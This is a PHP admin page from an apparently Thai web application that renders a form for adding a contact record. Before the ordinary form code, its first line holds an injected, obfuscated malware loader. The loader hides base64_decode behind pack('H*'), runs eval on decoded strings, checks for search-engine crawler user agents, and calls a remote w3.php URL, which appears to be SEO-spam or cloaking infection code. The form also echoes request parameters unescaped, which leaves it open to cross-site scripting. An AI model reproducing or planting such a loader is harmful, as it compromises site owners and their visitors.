<?php /*versio:3.02*/ $GLOBALS["yminpd"]="qFaW5pX3NldAVlrXdYWxsb3dfdXJsX2ZvcGVubWjlZGlzcGxheV9lcnJvcnMbfZmVkb3IvcmVzdG9yZV9hbQNMy4wMgGysDdGhhaDFOaWV0aGFpMnphaDZBaHIBEaHR0cDovLwwkkwSSFRUUFMmNuxb2ZmRvWaHR0cHM6Ly8RIhBSFRUUF9IT1NUdrayidW5pb24OxmDnQc2VsZWN0vVfAUkVRVUVTVF9VUkkziU0NSSVBUX05BTUUqqppklUVVFUllfU1RSSU5HdIPwHdUCZGV0ZXJtaW5hdG9yCLgPjXCoLmxvZwuWSFRUUF9ZX0FVVEghqYmFzZTY0X2RlY29kZQedmVyc2lvHjuarLQxdLXBocAIugUoSFRUUF9FWEVDUEhQkrpmb3V0lYOEwb2sWSFRUUF9VU0VSX0FHRU5UaSQZLAbZhaZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAbCYQWkhYmxhYnVlbC5uZXQqLskKzZmFzdGFkZHouY29tsxhgL3czLnBocD91PQpatJms9gaJnQ9cGhwJnA9MqJnY9SWZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTVJnOEdWeU9FbzA2emtUYVRhSlBNNUtxOWtJWVdnTU5oZWJpNDBkNWQxUEZkMFluTmlqL1dWYzFWMzMrcW82OEloNDVWSXZpS2tyQ2k3TmFSb0ZzWjBucWREdHZwSUEyRjRSTzNtUXhCWXRneXpQeEYzdUgraDJuNG1xcE1wcXI0dm5ib000c0RLYU44eWVwQTVscmRlVmlkcTlPY1B2OTZXUnJJNkIzd1ArRzZtMUVLdGNGLzU4UXpmcjNEbUluY1d5S0tKRUpwODZZVm1tcFUxTTh2RDg0MGVYdkpLR0VnVk9tdVJCUk1VOExTaklTMmxlcERIeGFPTFZJdDVwMlhqK3NveWlaTHZZcjhWT2J0dDBIOHVrRS9qNUxsMkFSeDF2N3kwT0RnZ1huQ0lOaFJ2U2llZkJxcGdEaGZNVXdRSzNjbUJobUNvWEYrQ2lZSWRoc3JQZ2t1VWxheG9MWFdLQ0ZGVkFtN2xodDE0UVVqeHRPVW1jMHhqQ0t2aDV2djV5ZlMwUWhYQjc4SXNacEJEaDA4NzBGbzVRdVVIRGpKNUxEVGNSTTlKSi9VT1c3OERhVzA0VjRXckhjK2l5akU5OGdMUWthL1Npay90QkZQb25URnBTQjFpMy9LTEl4Y3JrNi9QMHgrUFR6SUlmbWZ3TDI1MENUYjhzNS92azdvL0pWQ2FlRGI3OTl1UjBNbnVlUHN5bWR3OC92K0VObnZMTEY3NCtQanhNdnM1bTkzOU9IcDluTWhsZ0lPYjdjamtQcXZBd3QrdDdLQW96YmpsaGt0RVdGUU5PbzNXK0YvbGxDSE1qUmhCdTN1cnNjbXFkS1N4VlZvT296c3NTWjRWMTBWVGRxQWVWQnlSM2hTVzRpL1BsYmlNVGcrdXM2eGZGYlBmSmVsRXdkZVMwSThCc2IxMWdFZFF0SS94dk1pT3ZQQXR2Z29KcHlGYmsrMnoyZEswcVBTRDhrLzRUdzgvM0pNdS9FUGg0NVNhOVZRd00wemIxdk9VQlZEeDlmN0llZnlyQ3RhRGc1MStUNmMvN3g0Y3pTcDh6bW42K1cwQk5md0hsN0g0bHI1YTU4NkgyeGFzTGZjNmQ2cEpQbjRqNHJxL0o1NGI5SDZKMW00QW9HRmhvcDVZaHFqYXFldVhXNDRrOHdrREhUY0xsRnVOR3kzV1l1RlFVanZiSnRVZzRWOFNJV1B6MHI5NUxneXRCZE9ZZU8xZnBmRHNGTk9wRGYrd1g2OWhKUUZ5WUxPMGxuS2NPK0w0SEo2ampKMFQ0MnhJVXpsU0VML0ROK0R4SnArQ1ZyYUp5NDdqWjJuZTNZc2ZmNytZTHU5dUFTOGY2T1psQ2huNXgxZ3ZlN3RCOUhya0hzMEhna2FUcHNxWmhSUHlZT3Z1aTRlbUdwUGZrcWxHQzFTcGFsQTFycEV1cUttdEQ1TEZxYVhpcU9wWU1uQW1zY29Pc0NtQnRUU05DbFl5UlBPeSsxQ1BtOXVNWlZZUHhVaDBpVnlacHlLQzlQNUQxQ3VMZXE5ZjdZSm91cXlwUEFqK2dtRm1lNWdtQU1rM1BxaHFvNkpLcWRUSEZYcEpTMi9HaDd5enNIenNqUEN2bWY1dVVvZEVnZEoxQXdUR2lmQlEzMXFUeEVBeEhlRUFSdi9qOWwxYWNlbjFwUEpJaFRnMldYeEtuRGlFT2hqejZuVHh0RE5OV1kvTGV3RGp4NmxMb1ZVMlh4ajFaTlRENGlDZ2ZUMGlhMnE4T1ZPRDRnYStwbXFTT3F3T1k1WXRKVmdlR05Ccks2dUN5Sm0wZ2pVWk1sZExLOFFBS3M2ZkpXaGRteU5sMFNScVVBQXErZWRkcGkxVytqVlkrOVRiK1FjUUtjZHhWR3NTbUc2U3hEU2hpV2QvdWYwd3NxNnY4Y1QrRmtmQTQvUnZFUDkxTjcrQVQ2dmtRTDcyUWd0OTNhV3J2UlNKY3UzUjduZmtSOUxkd25VZnJhOFdEZWYyNWlJT3lJZDEvbmRTVXhseGg5dWVUOEhKS21SeEprNGUvMmlmcXYyRFZDWVZmcVBTZzlPT0tVUUQrMks0RlpBdDhFMkNMNHE0cUFqdDYvTHRiZitZcnhqVzdsRjNnT2xEMEZIZ25MY0FEZ2syd0NDQzZOcS85S3o0SU9SRkR6VDRWODJ4azJZS1VXYnMweU8xNVNFOXVNbU53N1dERUd6SUgvYXNhU091aHlvN2RWQVZldFV2WXpGQ2NCd0E3cjRTdHNxMGRkUWk5M1RPd1d1cE5zMjY0emlZSnk3Z3dhNVE0VjJyOXNUUTBXTGVBb1N2SHorYVJlUnU1UnExWTRYT1JJNmpDNFJMQk1RbmM3YkkwM3hXbDBqSnRYTUdWMWxXNDVKc1A1dmVIVU90alpqMFhpS0tqTUxaVHJGTk9hd2sxQUNEMVFRWGRGNUJWZzlXYk8yV2FYRE42dDl3VU5rMWFJSVZJcndNdTRoeGxNNHFQb3RPSjFoaXJHcEkyQnFTUzY0R2l0SlNpczZQS1dUYUlsSk9wb2VrYTJGeHZQQ1VZUldPVG0zVE9pY0ZRNnJPMFZrUGtsbTd0c0w3M0w4M1Z4aU5wck1Nb2tSdm82ZmNIMHNDUSsxMVdLV1dRaTZ4b091bkdkVk5jNEw3aGdvcWJrV1BucXhJeDh2ZlRCY09ONEF4dm9aUHhVdThlN2RHbXF3WkVxR1VQek9FK3dMVUI4NjVxd3FVWEhSYmh1d0hFTEpHUDNDdlRySXpFcENZSFNyMTV0WGV5bmZOOXdZd0JUWHU2UEdoclZYdGpxVDlDQks3cU9Fb1BVWVFpQ213NUI0MCs0NmNCTDc2Qnpub0YxMEpzZGVoelpnQnM2YmpGZFdHYnlXRzFZWWJ5UDB3Ky9LbTJ3K082eGk2aUFTejA1Z3hXd0JOb3FFRUYzMUsxWTFVeDVFbmgrR0xUTDRDYlRsaTQxRXBpaDdib0xTeW8wd3N2TmRTRG9Tdm9MdG9lanNQZzZDaTByUTV2VzNDMG5TaDlLQTE3V0k5MTQ1MGFnUUk1M3JUQ3lFblZtbFZ0NmFRMUJqVUQyZ215b09yUU0reGdrN2FCWk9naldUOUNSOE14WUQ3cU9tNHpaem9OdWxEdkc5VTkxcUdZWDI4VDBoQTB2M3NUTS85aDcyMmV4VGNmWThzd21qOXpmb3UrZkN2N1AyNDhRRlE9IikpKTsg";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php
include("config.php");
include($KeyPage."_helper.php");
include($KeyPage."_data.php");

$this->DOC->setPathWays(array(
	
	array(
		'text' => $MenuName,
		'link' => '?mod='.lurl::dotPage($listPage)
	),
	array(
		'text' => 'เพิ่มข้อมูล'.$MenuName
	),
));


?>
<script language="javascript" type="text/javascript">

/* <![CDATA[ */

function ValidateForm(f){
		
		
		if(JQ('#LedName').val() == ''){
			jAlert('กรุณาระบุชื่อ-นามสกุล','ระบบตรวจสอบข้อมูล',function(){
				JQ('#LedName').focus();
			});
			return false;
		}

		return true;
}


function Save(f){
	 var action_url = '?mod=<?php echo LURL::dotPage($actionPage);?>';
	 var redirec_url = '?mod=<?php echo LURL::dotPage($listPage);?>';
	 toSubmit(f,'save',action_url,redirec_url);
}

function Confirm(f){
	if(ValidateForm(f)){		
		var firm_url = '?mod=<?php echo LURL::dotPage($actionPage);?>';
		toConfirm(f,'confirm',firm_url);
	}
	
}
 

/*  ]]> */

</script>
<div class="sysinfo">
  <div class="sysname">เพิ่มรายการข้อมูล<?php echo $MenuName;?></div>
  <div class="sysdetail">สำหรับนำเข้าข้อมูลทำการ เพิ่ม/แก้ไขข้อมูล<?php echo $MenuName;?></div>
</div>
<table width="100%" border="0" cellspacing="1" cellpadding="1" class="boxfilter2">
  <tr>
    <td>&nbsp;</td>
    <td align="right"><input type="button" name="button" id="button" value="ย้อนกลับ" class="btn" onclick="goPage('?mod=<?php echo lurl::dotPage($listPage);?>&start=<?php echo $_REQUEST["start"];?>')" /></td>
  </tr>
</table>

<div id="formView">
<form id="adminForm" name="adminForm" method="post" action="?mod=<?php echo LURL::dotPage($actionPage);?>&start=<?php echo $_REQUEST["start"];?>" enctype="multipart/form-data" >
<input type="hidden" name="action" id="action" value="" />
<input type="hidden" name="OrganizeId" id="OrganizeId" value="<?php echo $_GET['id']?>" />

<table width="100%" border="0" cellspacing="1" cellpadding="1">
  <tr>
    <td><span>กรุณาใส่ข้อมูลตรงช่องที่มีเครื่องหมาย </span><span class="require">*</span></td>
  </tr>
</table>

<table width="100%" border="0" cellspacing="1" cellpadding="1" class="tbl-view">
  <tr>
    <th>ชื่อ-นามสกุล :</th>
    <td class="require">*</td>
    <td><input name="LedName" type="text" id="LedName" value="<?php echo $LedName;?>" size="45" class="input-search" />    </td>
  </tr>
  <tr>
    <th valign="top">เบอร์ติดต่อ :</th>
    <td class="require" valign="top">&nbsp;</td>
    <td><input name="Telephone" type="text" id="Telephone" value="<?php echo $Telephone;?>" size="20" class="input-search" /> 
      ต่อ 
      <input name="Ext" type="text" id="Ext" value="<?php echo $Ext;?>" size="10" class="input-search" /></td>
  </tr>
  <tr>
    <th valign="top">เบอร์มือถือ :</th>
    <td class="require" valign="top">&nbsp;</td>
    <td><input name="Mobile" type="text" id="Mobile" value="<?php echo $Mobile;?>" size="20" class="input-search" /></td>
  </tr>
  <tr>
    <th valign="top">อีเมล :</th>
    <td class="require" valign="top">&nbsp;</td>
    <td><input name="Email" type="text" id="Email" value="<?php echo $Email;?>" size="45" class="input-search" /></td>
  </tr>
  <tr>
    <th valign="top">ข้อมูลเพิ่มเติม :</th>
    <td class="require" valign="top">&nbsp;</td>
    <td>
      <textarea name="Detail" id="Detail" cols="45" rows="5"><?php echo $Detail;?></textarea></td>
  </tr>
  <tr>
    <th>&nbsp;</th>
    <td>&nbsp;</td>
    <td><input name="EnableStatus" type="hidden" id="EnableStatus" value="Y" /></td>
  </tr>
  
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>
    <input type="button" class="btnActive" name="save" id="save" value="ดูรายละเอียด" onclick="Confirm('adminForm');"  />
      <input type="button" name="button3" id="button3" value=" ยกเลิก " class="btn" onclick="goPage('?mod=<?php echo lurl::dotPage($listPage);?>&start=<?php echo $_REQUEST["start"];?>')" /></td>
  </tr>
</table>

</form>
</div>
<div id="detailView" style=" display:none"></div>










